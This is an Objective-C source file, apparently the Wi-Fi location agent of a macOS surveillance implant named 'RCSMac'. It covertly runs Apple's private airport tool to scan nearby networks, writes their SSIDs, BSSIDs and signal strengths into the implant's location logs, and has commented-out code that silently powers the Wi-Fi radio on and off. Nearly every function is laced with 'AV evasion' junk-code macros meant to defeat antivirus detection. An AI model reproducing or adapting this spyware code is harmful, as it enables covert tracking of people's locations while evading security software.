//
//  RCSMAgentPosition.m
//  RCSMac
//
//  Created by kiodo on 2/21/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//
//#import <CoreWLAN/CoreWLAN.h>
#import <Foundation/Foundation.h>

#import "RCSMCommon.h"
#import "RCSMAgentPosition.h"
#import "RCSMLogger.h"
#import "RCSMDebug.h"

#import "RCSMAVGarbage.h"

#define AIRPORT_TOOL @"/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport"

typedef struct _WiFiInfo {
  unsigned char MacAddress[6];    // BSSID
  unsigned char dummy[2];
  UInt32 uSsidLen;                // SSID length
  unsigned char Ssid[32];         // SSID
  UInt32 iRssi;                   // Received signal strength in _dBm_
} WiFiInfo;

static __m_MAgentPosition *sharedAgentPosition = nil;

extern BOOL ACInterfaceGetPower(SCNetworkInterfaceRef);
extern BOOL ACInterfaceSetPower(SCNetworkInterfaceRef, BOOL);

@interface __CWInterface : NSObject
{
  NSNumber *ssidLen;      // SSID length
  NSString *ssid;         // SSID
  NSNumber *rssi;         // Received signal strength in _dBm
  NSData   *bssidData;    // BSSID [macAddress]
}

@property (readwrite, retain) NSNumber *rssi;

+ (NSMutableArray*)parseDictionary: (NSData*)sSid;
+ (NSMutableArray*)scanForNetworksWithParameters:(NSDictionary*)parameters 
                                    error:(NSError**)error;
- (id)init;
- (NSString*)ssid;
- (NSData*)bssidData;
- (NSNumber*)ssidLen;

- (void)setSsid: (NSString*)aSsid;
- (void)setBssidData: (NSString*)aBssid;
- (void)setSsidLen: (NSNumber*) aSsidLen;

@end

@implementation __CWInterface : NSObject

@synthesize rssi;

+ (NSMutableArray*)scanForNetworksWithParameters:(NSDictionary*)parameters 
                                           error:(NSError**)error
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  NSMutableArray *cwArray = nil;
  NSString *tmpXmlName;
  NSTask *aTask;
  time_t randTime = 0;
  NSArray *arguments;
  NSString *airport = AIRPORT_TOOL;
  NSFileHandle *aFile;

  // Create tmp output file
  ctime(&randTime);
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  tmpXmlName = [[NSString alloc] initWithFormat: @"/tmp/43t9903zz%.8d.XXXX", randTime];
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  [@"" writeToFile: tmpXmlName
        atomically: YES
          encoding: NSUTF8StringEncoding
             error: nil];
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  aFile = [NSFileHandle fileHandleForUpdatingAtPath: tmpXmlName];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  if (aFile == nil) 
  {   
    // AV evasion: only on release build
    AV_GARBAGE_004
    
    [pool release];
    return nil;
  }
 
  // Running task with options
  aTask = [[NSTask alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  arguments = [NSArray arrayWithObjects: @"-s", @"-x", nil];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  [aTask setLaunchPath: airport];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  [aTask setArguments: arguments];

  // Output file handles
  [aTask setStandardOutput: aFile];
  [aTask setStandardError: aFile];
  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  // Run and wait
  [aTask launch];
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  [aTask waitUntilExit];
  
  int status = [aTask terminationStatus];
  
  [aTask release];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  if (status == 0)
  {   
    // AV evasion: only on release build
    AV_GARBAGE_003
    
    [aFile closeFile];
    
    // AV evasion: only on release build
    AV_GARBAGE_005
    
    NSData *tmpData = [[NSData alloc] initWithContentsOfFile: tmpXmlName];
    
    // AV evasion: only on release build
    AV_GARBAGE_004
    
    [[NSFileManager defaultManager] removeItemAtPath: tmpXmlName error: nil];
    
    // AV evasion: only on release build
    AV_GARBAGE_003
        
    if (tmpData != nil && [tmpData length])
    {   
      // AV evasion: only on release build
      AV_GARBAGE_001
      
      cwArray = [self parseDictionary: tmpData]; 
      
      // AV evasion: only on release build
      AV_GARBAGE_002
      
      [tmpData release];
    }
    else
    {
#ifdef DEBUG_POSITION
      NSLog(@"%s: error running airport tool: file is empty", __FUNCTION__);
#endif
    }

  }
  else
  {
#ifdef DEBUG_POSITION
    NSLog(@"%s: Task %@ failed.", __FUNCTION__, airport);
#endif
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  [tmpXmlName release];
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  [pool release];
  
  return cwArray;
}

+ (NSMutableArray*)parseDictionary: (NSData*)xmlData
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  NSMutableArray *tmpArray = nil;
  NSString *errorDesc;
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  if (xmlData == nil)
  {  
    // AV evasion: only on release build
    AV_GARBAGE_000
    
    return nil;
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  NSArray *xmlDictArray = 
  (NSArray *)[NSPropertyListSerialization 
              propertyListFromData: xmlData 
              mutabilityOption: NSPropertyListMutableContainersAndLeaves 
              format: nil  
              errorDescription: &errorDesc];
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  if (xmlDictArray == nil)
  {   
    // AV evasion: only on release build
    AV_GARBAGE_004
    
    return nil;
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  if ([xmlDictArray count])
    tmpArray = [[NSMutableArray alloc] initWithCapacity: [xmlDictArray count]];
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  for(int index=0; index < [xmlDictArray count]; index++)
  {
    NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
    
    // AV evasion: only on release build
    AV_GARBAGE_004
    
    NSNumber *i32Rssi;
    NSString *cBssid;
    NSString *cSsid;
    
    NSDictionary * tmpDict = (NSDictionary*)[xmlDictArray objectAtIndex: index];
    
    // AV evasion: only on release build
    AV_GARBAGE_004
    
    __CWInterface *tmpCWInt = [[__CWInterface alloc] init];
    
    // AV evasion: only on release build
    AV_GARBAGE_004
    
    if ((i32Rssi = [tmpDict objectForKey: @"RSSI"]) != nil) 
    {   
      // AV evasion: only on release build
      AV_GARBAGE_005
      
      NSNumber *tmpRssi = [[NSNumber alloc] initWithInt: [i32Rssi intValue]];
      
      // AV evasion: only on release build
      AV_GARBAGE_004
      
      [tmpCWInt setRssi: tmpRssi]; 
    }
    
    // AV evasion: only on release build
    AV_GARBAGE_003
    
    if ((cSsid = [tmpDict objectForKey: @"SSID_STR"]) != nil) 
    {   
      // AV evasion: only on release build
      AV_GARBAGE_004
      
      NSString *tmpSsid = [[NSString alloc] initWithFormat: @"%@", cSsid];
      
      // AV evasion: only on release build
      AV_GARBAGE_001
      
      [tmpCWInt setSsid: tmpSsid];
    }  
    
    // AV evasion: only on release build
    AV_GARBAGE_008
    
    if ((cBssid = [tmpDict objectForKey: @"BSSID"]) != nil) 
    {   
      // AV evasion: only on release build
      AV_GARBAGE_001
      
      [tmpCWInt setBssidData: cBssid];
    }
    
    // AV evasion: only on release build
    AV_GARBAGE_007
    
    [tmpArray addObject: tmpCWInt];
    
    // AV evasion: only on release build
    AV_GARBAGE_005    
    [tmpCWInt release];
    
    [innerPool release];
  }
  
  [outerPool release];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  return tmpArray;
}

- (id)init
{
  self = [super init];
  if (self)
  {
    bssidData = nil;   // BSSID
    ssidLen = nil;     // SSID length
    rssi = nil;        // Received signal strength in _dBm
    ssid = nil;         // SSID
  }
  
  return self;
}

- (void)setBssidData: (NSString*)aString
{   
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  if (aString != nil) 
  {
    char tmpBuff[256];
    
    // AV evasion: only on release build
    AV_GARBAGE_005
    
    memset(tmpBuff, 0, sizeof(tmpBuff));
    
    [aString getCString: tmpBuff 
              maxLength: sizeof(tmpBuff) 
               encoding: NSASCIIStringEncoding];
    
    // AV evasion: only on release build
    AV_GARBAGE_004
    
    if (strlen(tmpBuff))
    {
      int digit;
      
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      bssidData = [[NSData alloc] initWithBytes: "\x00\x00\x00\x00\x00\x00" length:6];
      char *dataPtr = (char *) [bssidData bytes]; 
      char **tokenPtr, *token[6];
      char *tmpPtr = tmpBuff;
      
      // AV evasion: only on release build
      AV_GARBAGE_002
      
      for (tokenPtr = token; (*tokenPtr = strsep(&tmpPtr, ":")) != NULL;)
        if (**tokenPtr != '\0')
          if (++tokenPtr >= &token[6])
            break;
      
      // AV evasion: only on release build
      AV_GARBAGE_007
      
      for (int i=0; i < 6; i++) 
      {
        sscanf(token[i], "%x", &digit);
        dataPtr[i] = digit;
      }
      
      // AV evasion: only on release build
      AV_GARBAGE_008      
    }
    else
    {   
      // AV evasion: only on release build
      AV_GARBAGE_009
      
      bssidData = nil;
    }
  }
}

- (NSData*)bssidData
{   
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  return bssidData;
}

- (NSString*)ssid
{   
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  return ssid;
}

- (NSNumber*)ssidLen
{   
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  return ssidLen;
}

- (void) setSsidLen: (NSNumber*)aSsidLen
{
  if (aSsidLen != nil) 
  {
#ifdef DEBUG_POSITION
    NSLog(@"%s: aSsidLen %@", __FUNCTION__, aSsidLen);
#endif
    
    if ([aSsidLen intValue] > 32)
    {
      ssidLen = [[NSNumber alloc] initWithInt: 32];
      [aSsidLen release];
    }
    else
      ssidLen = aSsidLen;
  }
  
#ifdef DEBUG_POSITION
  NSLog(@"%s: ssidLen %@", __FUNCTION__, ssidLen);
#endif
}

- (void)setSsid: (NSString*)aSsid
{   
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  if (aSsid != nil)
  {   
    // AV evasion: only on release build
    AV_GARBAGE_007
    
    if ([aSsid lengthOfBytesUsingEncoding: NSUTF8StringEncoding] > 32) 
    {   
      // AV evasion: only on release build
      AV_GARBAGE_005
      
      ssid = [[NSString alloc] initWithString: [aSsid substringToIndex: 32]];
      
      // AV evasion: only on release build
      AV_GARBAGE_004
      
      ssidLen = [[NSNumber alloc] initWithInt: 32];
    }
    else
    {   
      // AV evasion: only on release build
      AV_GARBAGE_009
      
      ssid = aSsid; 
      
      // AV evasion: only on release build
      AV_GARBAGE_001
      
      ssidLen = [[NSNumber alloc] initWithInt:[aSsid lengthOfBytesUsingEncoding: NSUTF8StringEncoding]];
    }
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_005
}

@end

@implementation __m_MAgentPosition
#pragma mark -
#pragma mark Class and init methods
#pragma mark -

+ (__m_MAgentPosition *)sharedInstance
{
  @synchronized(self)
  {
    if (sharedAgentPosition == nil)
    {
      //
      // Assignment is not done here
      //
      [[self alloc] init];
    }
  }
  
  return sharedAgentPosition;
}

- (id)copyWithZone: (NSZone *)aZone
{
  return self;
}

+ (id)allocWithZone: (NSZone *)aZone
{
  @synchronized(self)
  {
    if (sharedAgentPosition == nil)
    {
      sharedAgentPosition = [super allocWithZone: aZone];
      
      //
      // Assignment and return on first allocation
      //
      return sharedAgentPosition;
    }
  }
  
  // On subsequent allocation attemps return nil
  return nil;
}

- (unsigned)retainCount
{
  // Denotes an object that cannot be released
  return UINT_MAX;
}

- (id)retain
{
  return self;
}

- (id)autorelease
{
  return self;
}

- (void)release
{
  // Do nothing
}



- (BOOL)grabHotspots
{
  NSAutoreleasePool * pool = [[NSAutoreleasePool alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  //CFStringRef en1 = CFSTR("en1");
  //BOOL isAirportTurnedOn = YES;
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  LocationAdditionalData *agentAdditionalHeader;
  NSError *err = nil;
  NSDictionary *params = nil;
  
  // check if airport is running
  //  isAirportTurnedOn = [self isAirportPowerOn: en1];
  //  
  //  if (isAirportTurnedOn == NO)
  //  {
  //#ifdef DEBUG_POSITION
  //    NSLog(@"%s: airport is OFF try to start it up", __FUNCTION__);
  //#endif
  //    if ([self setAirportPower: en1 withMode: 1])
  //    {
  //#ifdef DEBUG_POSITION
  //      NSLog(@"%s: airport is ON", __FUNCTION__);
  //#endif    
  //      sleep(3);
  //    }
  //    else
  //    {
  //#ifdef DEBUG_POSITION
  //      NSLog(@"%s: airport is OFF error on forcing", __FUNCTION__);
  //#endif
  //    }
  //  }
  
  //  NSArray* scan = [NSMutableArray arrayWithArray:[[__CWInterface interface] 
  //                                                  scanForNetworksWithParameters:params 
  //                                                  error:&err]];
  // running airport tool...
  NSArray* scan = [__CWInterface scanForNetworksWithParameters: params 
                                                         error: &err];   
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  sleep(1);
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  // Turn off again the netintf
  //  if (isAirportTurnedOn == NO)
  //  {
  //#ifdef DEBUG_POSITION
  //    NSLog(@"%s: airport is now ON try to stop it again", __FUNCTION__);
  //#endif
  //    if ([self setAirportPower: en1 withMode: 0])
  //    {
  //#ifdef DEBUG_POSITION
  //      NSLog(@"%s: airport is OFF", __FUNCTION__);
  //#endif    
  //    }
  //    else
  //    {
  //#ifdef DEBUG_POSITION
  //      NSLog(@"%s: airport is already ON error on forcing", __FUNCTION__);
  //#endif
  //    }
  //  }
  
  if (scan == nil) 
  {   
    // AV evasion: only on release build
    AV_GARBAGE_005
    
    [pool release];
    
    return NO;
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  NSMutableData *rawAdditionalHeader = 
  [NSMutableData dataWithLength: sizeof(LocationAdditionalData)];
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  agentAdditionalHeader = (LocationAdditionalData *)[rawAdditionalHeader bytes];
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  agentAdditionalHeader->uVersion = LOG_LOCATION_VERSION;   
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  agentAdditionalHeader->uType = LOGTYPE_LOCATION_WIFI;   
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  agentAdditionalHeader->uStructNum = [scan count];
  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  __m_MLogManager *logManager = [__m_MLogManager sharedInstance];
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  BOOL success = [logManager createLog: LOGTYPE_LOCATION_NEW
                           agentHeader: rawAdditionalHeader
                             withLogID: 0];
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
#ifdef DEBUG_POSITION
  NSLog(@"%s: rawAdditionalHeader %@", __FUNCTION__, rawAdditionalHeader);
#endif
  
  if (success == TRUE)
  {   
    // AV evasion: only on release build
    AV_GARBAGE_001
    
    NSMutableData *tmpData = [[NSMutableData alloc] initWithLength: sizeof(WiFiInfo)];
    
    // AV evasion: only on release build
    AV_GARBAGE_002
    
    WiFiInfo *tmpInfo = (WiFiInfo *)[tmpData bytes];
    
    // AV evasion: only on release build
    AV_GARBAGE_003
    
    for (int i=0; i < [scan count]; i++) 
    {     
      // AV evasion: only on release build
      AV_GARBAGE_004
      
      memset(tmpInfo, 0, sizeof(tmpInfo));
      
      // AV evasion: only on release build
      AV_GARBAGE_000
      
      __CWInterface *icw = [scan objectAtIndex: i];
      
      // AV evasion: only on release build
      AV_GARBAGE_002
      
      if ([icw ssidLen] != nil)
      {
        // AV evasion: only on release build
        AV_GARBAGE_001
        
        tmpInfo->uSsidLen = [[icw ssidLen] intValue];        
      }
      
      // AV evasion: only on release build
      AV_GARBAGE_009
      
      if ([icw ssid] != nil && tmpInfo->uSsidLen)
      {   
        // AV evasion: only on release build
        AV_GARBAGE_006
        
        NSString *encStr = [icw ssid];
        
        // AV evasion: only on release build
        AV_GARBAGE_003
        
        NSData *tmpSSID = [encStr dataUsingEncoding: NSUTF8StringEncoding 
                               allowLossyConversion: YES];
        
        // AV evasion: only on release build
        AV_GARBAGE_003
        
        if (tmpSSID != nil) 
        {   
          // AV evasion: only on release build
          AV_GARBAGE_007
          
          memcpy(tmpInfo->Ssid, [tmpSSID bytes], tmpInfo->uSsidLen);
        }
        else
        {
          // AV evasion: only on release build
          AV_GARBAGE_004
          
          tmpInfo->uSsidLen = 4;
          memcpy(tmpInfo->Ssid, "XXXX", 4);
        }
        
        // AV evasion: only on release build
        AV_GARBAGE_000
        
      }
      else
      {       
        // AV evasion: only on release build
        AV_GARBAGE_008
        
        tmpInfo->uSsidLen = 0;
      }
      
      // AV evasion: only on release build
      AV_GARBAGE_000
      
      if ([icw bssidData] != nil)
      {   
        // AV evasion: only on release build
        AV_GARBAGE_007
        
        memcpy(tmpInfo->MacAddress, [[icw bssidData] bytes], sizeof(tmpInfo->MacAddress));
      }
      
      // AV evasion: only on release build
      AV_GARBAGE_000
      
      if ([icw rssi] != nil)
      {   
        // AV evasion: only on release build
        AV_GARBAGE_002
        
        tmpInfo->iRssi = [[icw rssi] intValue];
      }
      
      // AV evasion: only on release build
      AV_GARBAGE_006
      
      [logManager writeDataToLog: tmpData
                        forAgent: LOGTYPE_LOCATION_NEW
                       withLogID: 0];
      
      // AV evasion: only on release build
      AV_GARBAGE_008
      
    }
    
    [tmpData release];
    
    // AV evasion: only on release build
    AV_GARBAGE_007
    
    [logManager closeActiveLog: LOGTYPE_LOCATION_NEW
                     withLogID: 0];
  }
  else
  {
#ifdef DEBUG_POSITION
    NSLog(@"%s: error creating logs", __FUNCTION__);
#endif
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  [scan release];
  
  [pool release];
  
  return YES;
}

- (SCNetworkInterfaceRef)getAirportInterface:(CFStringRef) aNetInterface
{
  SCNetworkInterfaceRef intf = NULL;
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  CFArrayRef netIntfArray = SCNetworkInterfaceCopyAll();
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  if (netIntfArray == NULL)
  {
    return NULL;
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  int arrayCount = CFArrayGetCount(netIntfArray);
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  for(int i=0; i < arrayCount; i++)
  {   
    // AV evasion: only on release build
    AV_GARBAGE_003
    
    intf = CFArrayGetValueAtIndex(netIntfArray, i);
    
    // AV evasion: only on release build
    AV_GARBAGE_002
    
    CFStringRef intfName = SCNetworkInterfaceGetBSDName(intf);
    
    // AV evasion: only on release build
    AV_GARBAGE_001
    
    if( CFStringCompare(intfName, aNetInterface, kCFCompareCaseInsensitive) == kCFCompareEqualTo)
      break;
  }
  
  CFRetain(intf);
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  CFRelease(netIntfArray);
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  return  intf;
}

- (BOOL)isAirportPowerOn:(CFStringRef)aNetInterface
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  BOOL isPowered = NO;
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  SCNetworkInterfaceRef intf = [self getAirportInterface: aNetInterface];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  if (intf != NULL)
  {   
    // AV evasion: only on release build
    AV_GARBAGE_002
    
    isPowered = ACInterfaceGetPower(intf);
    CFRelease(intf);  
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  [pool release];
  
  return isPowered;
}

- (BOOL)setAirportPower:(CFStringRef) aNetInterface withMode:(BOOL)power
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  SCNetworkInterfaceRef intf = [self getAirportInterface: aNetInterface];
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  if (intf != NULL)
  {   
    // AV evasion: only on release build
    AV_GARBAGE_001
    
    ACInterfaceSetPower(intf, power);
    CFRelease(intf);
  }
  else
  {   
    // AV evasion: only on release build
    AV_GARBAGE_002
    
    [pool release];
    return NO;
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  [pool release];
  
  return YES;
}


#pragma mark -
#pragma mark Agent Formal Protocol Methods
#pragma mark -

- (BOOL)stop
{
  int internalCounter = 0;
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  [mAgentConfiguration setObject: AGENT_STOP
                          forKey: @"status"];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  while ([mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED
         && internalCounter <= MAX_STOP_WAIT_TIME)
  {
    internalCounter++;
    usleep(100000);
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  return YES;
}

- (void)start
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  [mAgentConfiguration setObject: AGENT_RUNNING forKey: @"status"];
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  [self grabHotspots];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  [mAgentConfiguration setObject: AGENT_STOPPED
                          forKey: @"status"];     
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  [outerPool release];
}

- (BOOL)resume
{   
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  return YES;
}

#pragma mark -
#pragma mark Getter/Setter
#pragma mark -

- (NSMutableDictionary *)mAgentConfiguration
{   
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  return mAgentConfiguration;
}

- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration
{   
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  if (aConfiguration != mAgentConfiguration)
  {   
    // AV evasion: only on release build
    AV_GARBAGE_001
    
    [mAgentConfiguration release];
    mAgentConfiguration = [aConfiguration retain];
  }
}


@end
